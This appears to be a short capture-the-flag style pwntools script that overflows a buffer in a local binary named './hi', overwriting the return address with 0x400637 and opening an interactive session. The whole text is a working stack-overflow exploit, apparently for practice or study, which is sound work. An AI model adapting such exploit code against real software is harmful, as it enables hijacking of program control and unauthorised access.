from pwn import *

gb = b'a' * 32
gbt = b'a' * 8
add = p64(0x400637)
msg = gb + gbt + add
p = process("./hi")
p.sendline(msg)
p.interactive()